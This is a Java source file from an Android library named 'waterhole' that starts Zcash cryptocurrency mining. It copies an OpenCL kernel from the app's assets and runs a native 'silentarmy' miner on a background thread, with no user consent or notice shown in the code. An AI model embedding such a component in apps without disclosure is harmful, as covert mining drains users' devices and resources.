package waterhole.miner.zcash;

import android.content.Context;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import waterhole.commonlibs.ContextWrapper;
import waterhole.commonlibs.NoProGuard;
import waterhole.commonlibs.utils.IOUtils;

/**
 * Zcash挖矿接口类.
 *
 * @author kzw on 2018/03/12.
 */
public final class ZcashMiner implements NoProGuard {

    static {
        try {
            System.loadLibrary("silentarmy");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private native static void execSilentarmy();

    public static void startMine() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                InputStream in = null;
                OutputStream out = null;
                Context context = ContextWrapper.getInstance().obtainContext();
                try {
                    final String kernelFile = "kernel.cl";
                    in = context.getResources().getAssets().open(kernelFile);
                    final File of = new File(context.getDir("execdir", Context.MODE_PRIVATE), kernelFile);
                    out = new FileOutputStream(of);
                    final byte b[] = new byte[65535];
                    int sz;
                    while ((sz = in.read(b)) > 0) {
                        out.write(b, 0, sz);
                    }

                    execSilentarmy();
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    IOUtils.closeSafely(in);
                    IOUtils.closeSafely(out);
                }
            }
        }).start();
    }
}
